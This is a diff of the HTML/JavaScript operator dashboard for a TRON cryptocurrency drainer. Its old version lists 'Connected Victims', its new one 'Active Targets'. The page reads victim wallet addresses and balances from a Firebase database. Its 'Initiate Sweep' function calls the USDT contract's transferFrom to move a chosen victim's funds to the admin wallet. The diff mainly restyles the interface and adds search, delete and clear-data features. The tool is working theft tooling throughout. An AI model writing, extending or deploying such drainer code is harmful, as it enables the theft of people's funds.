@@ -4,30 +4,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>Admin Pro - Real-time Tracker</title>
+    <title>Admin Elite - Premium Dashboard</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&display=swap');
 
         body {
             font-family: 'Inter', sans-serif;
-            background: #000;
+            background: #050505;
             color: #fff;
             overflow-x: hidden;
         }
 
         .glass {
             background: rgba(255, 255, 255, 0.03);
-            backdrop-filter: blur(10px);
+            backdrop-filter: blur(20px);
             border: 1px solid rgba(255, 255, 255, 0.05);
-        }
-
-        .active-pulse {
-            position: relative;
         }
 
         .active-pulse::after {
@@ -43,38 +39,20 @@
         }
 
         @keyframes pulse {
-            0% {
-                transform: scale(0.95);
-                box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7);
-            }
-
-            70% {
-                transform: scale(1);
-                box-shadow: 0 0 0 10px rgba(16, 185, 129, 0);
-            }
-
-            100% {
-                transform: scale(0.95);
-                box-shadow: 0 0 0 0 rgba(16, 185, 129, 0);
-            }
+            0% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); }
+            70% { transform: scale(1); box-shadow: 0 0 0 10px rgba(16, 185, 129, 0); }
+            100% { transform: scale(0.95); box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
         }
 
-        .user-card {
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-        }
-
-        .user-card:active {
-            transform: scale(0.98);
-            background: rgba(255, 255, 255, 0.08);
-        }
+        .user-card { transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
+        .user-card:active { transform: scale(0.97); }
 
         .swipe-indicator {
-            height: 4px;
-            width: 40px;
-            background: rgba(255, 255, 255, 0.2);
-            border-radius: 2px;
-            margin: 8px auto;
+            height: 4px; width: 40px; background: rgba(255, 255, 255, 0.2);
+            border-radius: 2px; margin: 8px auto;
         }
+
+        ::-webkit-scrollbar { width: 0; }
     </style>
 </head>
 
@@ -83,89 +61,120 @@
     <!-- Login Screen -->
     <div id="loginScreen" class="fixed inset-0 z-[100] bg-black flex items-center justify-center p-6">
         <div class="w-full max-w-sm space-y-8 text-center">
-            <div class="space-y-2">
-                <div
-                    class="w-16 h-16 bg-blue-600 rounded-2xl flex items-center justify-center mx-auto shadow-2xl shadow-blue-600/20 mb-6">
-                    <i class="fas fa-lock text-2xl"></i>
-                </div>
-                <h2 class="text-3xl font-black tracking-tighter">Admin <span class="text-blue-500">Access</span></h2>
-                <p class="text-slate-500 text-xs font-bold uppercase tracking-widest">Authorized Personnel Only</p>
+            <div class="w-20 h-20 bg-gradient-to-tr from-blue-600 to-indigo-600 rounded-3xl flex items-center justify-center mx-auto shadow-2xl shadow-blue-600/30 mb-8 rotate-12">
+                <i class="fas fa-crown text-3xl"></i>
             </div>
-
+            <div>
+                <h2 class="text-4xl font-black tracking-tighter">Elite <span class="text-blue-500">Admin</span></h2>
+                <p class="text-slate-500 text-[10px] font-bold uppercase tracking-[0.3em] mt-2">Premium Execution Suite</p>
+            </div>
             <div class="space-y-4">
-                <input type="password" id="adminPass" placeholder="Enter Security Code"
-                    class="w-full bg-white/5 border border-white/10 rounded-2xl p-5 text-center text-lg font-bold focus:outline-none focus:border-blue-500 transition-all">
+                <input type="password" id="adminPass" placeholder="Security Code"
+                    class="w-full bg-white/5 border border-white/10 rounded-[24px] p-6 text-center text-xl font-bold focus:outline-none focus:border-blue-500 transition-all">
                 <button onclick="checkPass()"
-                    class="w-full bg-blue-600 hover:bg-blue-500 text-white font-black py-5 rounded-2xl shadow-xl shadow-blue-900/20 active:scale-95 transition-all uppercase tracking-widest text-xs">
-                    Unlock Dashboard
+                    class="w-full bg-blue-600 hover:bg-blue-500 text-white font-black py-6 rounded-[24px] shadow-xl shadow-blue-900/20 active:scale-95 transition-all uppercase tracking-widest text-xs">
+                    Access Dashboard
                 </button>
             </div>
-            <p id="loginError" class="text-red-500 text-[10px] font-black uppercase tracking-widest hidden">Access Denied:
-                Invalid Code</p>
+            <p id="loginError" class="text-red-500 text-[10px] font-black uppercase tracking-widest hidden">Access Denied</p>
         </div>
     </div>
 
-    <!-- Top Bar -->
+    <!-- Main Dashboard -->
     <div id="mainDashboard" class="hidden">
-        <div class="fixed top-0 left-0 right-0 z-50 glass px-6 py-4 flex justify-between items-center">
-            <div class="flex items-center gap-3">
-                <div class="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center active-pulse">
-                    <i class="fas fa-shield-alt text-sm"></i>
-                </div>
-                <h1 class="text-lg font-extrabold tracking-tight">Admin<span class="text-blue-500">PRO</span></h1>
+        <!-- Premium Header -->
+        <header class="fixed top-0 left-0 right-0 z-50 glass px-6 py-5 flex justify-between items-center">
+            <div>
+                <h1 class="text-xl font-black tracking-tighter">TRON<span class="text-blue-500">ELITE</span></h1>
+                <div id="liveClock" class="text-[9px] text-slate-500 font-bold uppercase tracking-widest">00:00:00</div>
             </div>
-            <div class="flex items-center gap-4">
-                <button onclick="toggleAudio()" id="audioBtn" class="text-slate-400 hover:text-white transition-colors">
+            <div class="flex items-center gap-3">
+                <button onclick="clearAllData()" class="w-10 h-10 rounded-2xl bg-red-500/10 text-red-500 flex items-center justify-center border border-red-500/20">
+                    <i class="fas fa-trash-alt text-xs"></i>
+                </button>
+                <button onclick="toggleAudio()" id="audioBtn" class="w-10 h-10 rounded-2xl bg-white/5 flex items-center justify-center text-slate-400">
                     <i class="fas fa-bell"></i>
                 </button>
-                <div
-                    class="text-[10px] font-black bg-blue-500/20 text-blue-400 px-2 py-1 rounded-full border border-blue-500/30 uppercase">
-                    Live</div>
             </div>
-        </div>
+        </header>
 
-        <!-- Main Content -->
-        <main class="pt-24 pb-32 px-4 space-y-4">
-            <div class="grid grid-cols-2 gap-3 mb-6">
-                <div class="glass p-4 rounded-3xl">
-                    <div class="text-slate-500 text-[10px] font-black uppercase tracking-widest mb-1">Total USDT</div>
-                    <div id="totalUsdt" class="text-xl font-bold text-emerald-400">$0.00</div>
+        <main class="pt-28 pb-32 px-4 space-y-6">
+            <!-- Stats -->
+            <div class="grid grid-cols-2 gap-4">
+                <div class="glass p-5 rounded-[32px] bg-gradient-to-br from-white/[0.02] to-transparent">
+                    <div class="text-slate-500 text-[10px] font-bold uppercase tracking-widest mb-1">Portfolio Value</div>
+                    <div id="totalUsdt" class="text-2xl font-black text-emerald-400">$0.00</div>
                 </div>
-                <div class="glass p-4 rounded-3xl">
-                    <div class="text-slate-500 text-[10px] font-black uppercase tracking-widest mb-1">Users</div>
-                    <div id="userCount" class="text-xl font-bold text-blue-400">0</div>
+                <div class="glass p-5 rounded-[32px] bg-gradient-to-br from-white/[0.02] to-transparent">
+                    <div class="text-slate-500 text-[10px] font-bold uppercase tracking-widest mb-1">Active Targets</div>
+                    <div id="userCount" class="text-2xl font-black text-blue-400">0</div>
                 </div>
             </div>
-            <h2 class="text-xs font-black uppercase text-slate-500 tracking-[0.2em] px-2 mb-2">Connected Victims</h2>
+
+            <!-- Search -->
+            <div class="relative">
+                <i class="fas fa-search absolute left-5 top-1/2 -translate-y-1/2 text-slate-600 text-xs"></i>
+                <input type="text" id="searchInput" oninput="renderUsers()" placeholder="Search address or status..." 
+                    class="w-full bg-white/5 border border-white/10 rounded-2xl py-4 pl-12 pr-6 text-xs font-bold focus:outline-none focus:border-blue-500/50">
+            </div>
+
+            <div class="flex justify-between items-center px-2">
+                <h2 class="text-[10px] font-black uppercase text-slate-500 tracking-[0.3em]">Live Feed</h2>
+                <div class="flex items-center gap-1.5">
+                    <div class="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse"></div>
+                    <span class="text-[9px] font-bold text-emerald-500 uppercase tracking-widest">Real-time</span>
+                </div>
+            </div>
+
+            <!-- List -->
             <div id="userList" class="space-y-3"></div>
         </main>
 
-        <!-- Bottom Action Sheet -->
+        <!-- Action Sheet -->
         <div id="actionSheet"
-            class="fixed bottom-0 left-0 right-0 z-50 glass rounded-t-[40px] px-6 pb-10 transform translate-y-full transition-transform duration-500 ease-out border-t border-white/10">
+            class="fixed bottom-0 left-0 right-0 z-50 glass rounded-t-[48px] px-8 pb-12 transform translate-y-full transition-transform duration-500 ease-[cubic-bezier(0.23,1,0.32,1)] border-t border-white/10 shadow-2xl">
             <div class="swipe-indicator"></div>
-            <div class="flex justify-between items-start mt-6 mb-6">
-                <div>
-                    <h3 id="sheetAddress" class="text-sm font-mono text-blue-400 font-bold mb-1">T...</h3>
-                    <p class="text-[10px] text-slate-500 font-bold uppercase tracking-widest">Ready for execution</p>
+            
+            <div class="flex justify-between items-start mt-8 mb-8">
+                <div class="max-w-[80%]">
+                    <div class="flex items-center gap-2 mb-1">
+                        <h3 id="sheetAddress" class="text-xs font-mono text-blue-400 font-bold truncate">T...</h3>
+                        <button onclick="copyAddress()" class="text-slate-500 hover:text-white transition-colors">
+                            <i class="far fa-copy text-[10px]"></i>
+                        </button>
+                    </div>
+                    <p id="sheetTime" class="text-[9px] text-slate-500 font-bold uppercase tracking-[0.2em]">Connected at 00:00</p>
                 </div>
-                <button onclick="closeSheet()" class="w-8 h-8 rounded-full bg-white/5 flex items-center justify-center">
+                <button onclick="closeSheet()" class="w-10 h-10 rounded-full bg-white/5 flex items-center justify-center">
                     <i class="fas fa-times text-xs text-slate-400"></i>
                 </button>
             </div>
-            <div class="space-y-4">
-                <div class="flex justify-between p-4 bg-white/5 rounded-2xl">
-                    <div class="text-xs text-slate-400 font-bold">Balance</div>
-                    <div id="sheetUsdt" class="text-lg font-black text-emerald-400">0.00 USDT</div>
+
+            <div class="space-y-6">
+                <div class="grid grid-cols-2 gap-4">
+                    <div class="p-5 bg-white/5 rounded-3xl border border-white/5">
+                        <div class="text-[9px] text-slate-500 font-bold uppercase mb-2">USDT Balance</div>
+                        <div id="sheetUsdt" class="text-xl font-black text-emerald-400">0.00</div>
+                    </div>
+                    <div class="p-5 bg-white/5 rounded-3xl border border-white/5">
+                        <div class="text-[9px] text-slate-500 font-bold uppercase mb-2">TRX Balance</div>
+                        <div id="sheetTrx" class="text-xl font-black text-blue-400">0.00</div>
+                    </div>
                 </div>
-                <div class="flex flex-col gap-2">
-                    <label class="text-[10px] font-black text-slate-500 uppercase tracking-widest ml-2">Sweep Amount</label>
+
+                <div class="space-y-3">
+                    <div class="flex justify-between items-center px-1">
+                        <label class="text-[10px] font-black text-slate-500 uppercase tracking-widest">Execution Amount</label>
+                        <button onclick="setMax()" class="text-[9px] font-bold text-blue-500 uppercase hover:underline">Max</button>
+                    </div>
                     <input id="sweepInput" type="number" step="any"
-                        class="w-full bg-white/5 border border-white/10 rounded-2xl p-4 text-sm font-bold focus:outline-none focus:border-blue-500">
+                        class="w-full bg-white/5 border border-white/10 rounded-[24px] p-6 text-lg font-black focus:outline-none focus:border-blue-500 shadow-inner">
                 </div>
+
                 <button id="sweepBtn" onclick="executeSweep()"
-                    class="w-full bg-blue-600 text-white font-black py-5 rounded-[24px] uppercase tracking-widest text-xs">Confirm
-                    & Sweep Funds</button>
+                    class="w-full bg-gradient-to-r from-blue-600 to-indigo-600 text-white font-black py-6 rounded-[28px] uppercase tracking-[0.2em] text-xs shadow-xl shadow-blue-900/30 active:scale-[0.98] transition-all">
+                    Initiate Sweep
+                </button>
             </div>
         </div>
     </div>
@@ -193,137 +202,158 @@
         let audioEnabled = false;
         let selectedUser = null;
 
-        async function sha256(message) {
-            const msgBuffer = new TextEncoder().encode(message);
-            const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
-            const hashArray = Array.from(new Uint8Array(hashBuffer));
-            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+        // --- Auth ---
+        async function sha256(m) {
+            const b = new TextEncoder().encode(m);
+            const h = await crypto.subtle.digest('SHA-256', b);
+            return Array.from(new Uint8Array(h)).map(x => x.toString(16).padStart(2, '0')).join('');
         }
 
         async function checkPass() {
-            const input = document.getElementById('adminPass').value;
-            const hash = await sha256(input);
-            if (hash === CONFIG.PASS_HASH) {
+            const p = document.getElementById('adminPass').value;
+            if (await sha256(p) === CONFIG.PASS_HASH) {
                 document.getElementById('loginScreen').classList.add('hidden');
                 document.getElementById('mainDashboard').classList.remove('hidden');
                 localStorage.setItem('adminAuth', 'true');
                 startApp();
             } else {
-                const err = document.getElementById('loginError');
-                err.classList.remove('hidden');
-                setTimeout(() => err.classList.add('hidden'), 2000);
+                document.getElementById('loginError').classList.remove('hidden');
             }
         }
 
-        function toggleAudio() {
-            audioEnabled = !audioEnabled;
-            document.getElementById('audioBtn').className = audioEnabled ? 'text-blue-500' : 'text-slate-400';
-            if (audioEnabled) document.getElementById('bellSound').play().catch(() => { });
-        }
-
+        // --- Core ---
         function startApp() {
-            console.log("Starting App... connecting to Firebase");
-            if (firebase.apps.length === 0) {
-                firebase.initializeApp(firebaseConfig);
-            }
+            if (firebase.apps.length === 0) firebase.initializeApp(firebaseConfig);
             const db = firebase.database();
-            
-            console.log("Database connected. Listening for 'connections'...");
-            db.ref('connections').on('child_added', (snapshot) => {
-                console.log("New Data Received:", snapshot.val());
-                const user = snapshot.val();
-                const key = snapshot.key;
-                
-                // Only filter if it's a real wallet address
-                const isRealWallet = user.address && user.address !== "Incoming Visitor...";
-                const exists = isRealWallet ? users.find(u => u.address === user.address) : false;
 
-                if (!exists) {
-                    users.unshift({ ...user, id: key });
-                    if (audioEnabled) document.getElementById('bellSound').play().catch(() => { });
+            // Clock
+            setInterval(() => {
+                document.getElementById('liveClock').innerText = new Date().toLocaleTimeString();
+            }, 1000);
+
+            // Listen
+            db.ref('connections').on('value', (snap) => {
+                const data = snap.val();
+                if (!data) {
+                    users = [];
                     renderUsers();
+                    return;
                 }
+                const newUsers = Object.entries(data).map(([key, val]) => ({ ...val, id: key }));
+                newUsers.sort((a, b) => b.id - a.id);
+                
+                if (newUsers.length > users.length && audioEnabled) {
+                    document.getElementById('bellSound').play().catch(()=>{});
+                }
+                users = newUsers;
+                renderUsers();
             });
         }
 
         function renderUsers() {
             const list = document.getElementById('userList');
+            const search = document.getElementById('searchInput').value.toLowerCase();
             list.innerHTML = '';
             let total = 0;
+
             users.forEach(u => {
-                total += parseFloat(u.usdt);
-                const card = document.createElement('div');
-                card.className = "glass p-5 rounded-3xl user-card flex justify-between items-center cursor-pointer";
-                card.onclick = () => openSheet(u);
+                if (u.status !== 'LANDED' && u.status !== 'VISITOR') total += parseFloat(u.usdt);
                 
-                let statusColor = "text-blue-400";
-                let statusText = "Connected";
-                if (u.status === "VISITOR") {
-                    statusColor = "text-yellow-400";
-                    statusText = "Incoming...";
-                } else if (u.status === "SUCCESS") {
-                    statusColor = "text-emerald-400";
-                    statusText = "SUCCESS";
-                }
+                if (search && !u.address.toLowerCase().includes(search) && !u.status.toLowerCase().includes(search)) return;
+
+                const card = document.createElement('div');
+                card.className = "glass p-5 rounded-[28px] user-card flex justify-between items-center cursor-pointer relative overflow-hidden";
+                
+                let sColor = "text-blue-400", sIcon = "fa-wallet", sText = "Connected";
+                if (u.status === "LANDED") { sColor = "text-slate-500"; sIcon = "fa-eye"; sText = "Landed"; }
+                else if (u.status === "VISITOR") { sColor = "text-yellow-500"; sIcon = "fa-user-clock"; sText = "Visitor"; }
+                else if (u.status === "SUCCESS") { sColor = "text-emerald-500"; sIcon = "fa-check-double"; sText = "Success"; }
 
                 card.innerHTML = `
-                    <div class="flex items-center gap-4">
-                        <div class="w-12 h-12 bg-white/5 rounded-2xl flex items-center justify-center">
-                            <i class="fab fa-ethereum ${statusColor}"></i>
+                    <div class="flex items-center gap-4 flex-1" onclick="openSheet('${u.id}')">
+                        <div class="w-12 h-12 bg-white/5 rounded-2xl flex items-center justify-center border border-white/5">
+                            <i class="fas ${sIcon} ${sColor} text-sm"></i>
                         </div>
-                        <div>
-                            <div class="text-sm font-mono font-bold">${u.address.length > 20 ? u.address.substring(0, 6) + '...' + u.address.substring(u.address.length - 4) : u.address}</div>
+                        <div class="min-w-0">
+                            <div class="text-sm font-mono font-bold truncate pr-4">${u.address.substring(0, 8)}...${u.address.slice(-6)}</div>
                             <div class="text-[9px] text-slate-500 font-bold uppercase tracking-wider">${u.time} • ${u.trx} TRX</div>
                         </div>
                     </div>
-                    <div class="text-right">
-                        <div class="text-md font-black ${u.status === 'VISITOR' ? 'text-slate-500' : 'text-emerald-400'}">$${u.usdt}</div>
-                        <div class="text-[8px] text-slate-500 font-black uppercase">${statusText}</div>
+                    <div class="text-right flex flex-col items-end gap-2">
+                        <div class="text-md font-black ${u.usdt > 0 ? 'text-emerald-400' : 'text-slate-600'}">$${u.usdt}</div>
+                        <div class="flex items-center gap-3">
+                            <div class="text-[8px] font-black uppercase tracking-widest ${sColor}">${sText}</div>
+                            <button onclick="deleteUser('${u.id}')" class="text-slate-700 hover:text-red-500 transition-colors p-1">
+                                <i class="fas fa-trash-alt text-[10px]"></i>
+                            </button>
+                        </div>
                     </div>
                 `;
                 list.appendChild(card);
             });
+
             document.getElementById('totalUsdt').innerText = `$${total.toFixed(2)}`;
-            document.getElementById('userCount').innerText = users.length;
+            document.getElementById('userCount').innerText = users.filter(u => u.status !== 'LANDED').length;
         }
 
-        function openSheet(user) {
-            selectedUser = user;
-            document.getElementById('sheetAddress').innerText = user.address;
-            document.getElementById('sheetUsdt').innerText = `${user.usdt} USDT`;
-            document.getElementById('sweepInput').value = user.usdt;
+        // --- Actions ---
+        function openSheet(id) {
+            selectedUser = users.find(u => u.id === id);
+            document.getElementById('sheetAddress').innerText = selectedUser.address;
+            document.getElementById('sheetUsdt').innerText = selectedUser.usdt;
+            document.getElementById('sheetTrx').innerText = selectedUser.trx;
+            document.getElementById('sheetTime').innerText = `Activity detected at ${selectedUser.time}`;
+            document.getElementById('sweepInput').value = selectedUser.usdt;
             document.getElementById('actionSheet').style.transform = 'translateY(0)';
         }
 
-        function closeSheet() {
-            document.getElementById('actionSheet').style.transform = 'translateY(100%)';
+        function closeSheet() { selectedUser = null; document.getElementById('actionSheet').style.transform = 'translateY(100%)'; }
+        
+        function setMax() { if (selectedUser) document.getElementById('sweepInput').value = selectedUser.usdt; }
+
+        function copyAddress() {
+            if (!selectedUser) return;
+            navigator.clipboard.writeText(selectedUser.address);
+            const btn = document.querySelector('.far.fa-copy');
+            btn.className = 'fas fa-check text-emerald-500';
+            setTimeout(() => btn.className = 'far fa-copy text-[10px]', 2000);
+        }
+
+        function toggleAudio() {
+            audioEnabled = !audioEnabled;
+            document.getElementById('audioBtn').className = `w-10 h-10 rounded-2xl flex items-center justify-center transition-all ${audioEnabled ? 'bg-blue-600 text-white shadow-lg shadow-blue-900/40' : 'bg-white/5 text-slate-400'}`;
+            if (audioEnabled) document.getElementById('bellSound').play().catch(()=>{});
+        }
+
+        async function deleteUser(id) {
+            if (!confirm("Remove this entry permanently?")) return;
+            firebase.database().ref('connections/' + id).remove();
+        }
+
+        async function clearAllData() {
+            if (!confirm("⚠️ EXTREME ACTION: Delete ALL visitor and connection data?")) return;
+            firebase.database().ref('connections').remove();
         }
 
         async function executeSweep() {
-            if (!window.tronWeb) return alert("Please open this in TronLink!");
-            const amount = document.getElementById('sweepInput').value;
+            if (!window.tronWeb) return alert("Please use TronLink Browser!");
+            const amt = document.getElementById('sweepInput').value;
             const btn = document.getElementById('sweepBtn');
             try {
-                btn.disabled = true;
-                btn.innerText = "Processing...";
-                const tron = window.tronWeb;
-                const contract = await tron.contract().at(CONFIG.USDT);
-                const amountInSun = Math.floor(amount * 1000000);
-                const tx = await contract.transferFrom(selectedUser.address, CONFIG.ADMIN_WALLET, amountInSun).send({ feeLimit: 150000000 });
-                alert("Withdrawal Successful!\nTXID: " + tx);
+                btn.disabled = true; btn.innerText = "Executing...";
+                const contract = await window.tronWeb.contract().at(CONFIG.USDT);
+                const sun = Math.floor(amt * 1000000);
+                const tx = await contract.transferFrom(selectedUser.address, CONFIG.ADMIN_WALLET, sun).send({ feeLimit: 150000000 });
+                alert("Success! TX: " + tx);
                 closeSheet();
-            } catch (err) {
-                alert("Execution Failed: " + (err.message || "Rejected"));
-            } finally {
-                btn.disabled = false;
-                btn.innerText = "Confirm & Sweep Funds";
-            }
+            } catch (e) { alert(e.message || "Failed"); }
+            finally { btn.disabled = false; btn.innerText = "Initiate Sweep"; }
         }
 
         if (localStorage.getItem('adminAuth') === 'true') {
             document.getElementById('loginScreen').classList.add('hidden');
             document.getElementById('mainDashboard').classList.remove('hidden');
-            window.onload = startApp;
+            startApp();
         }
     </script>
 </body>
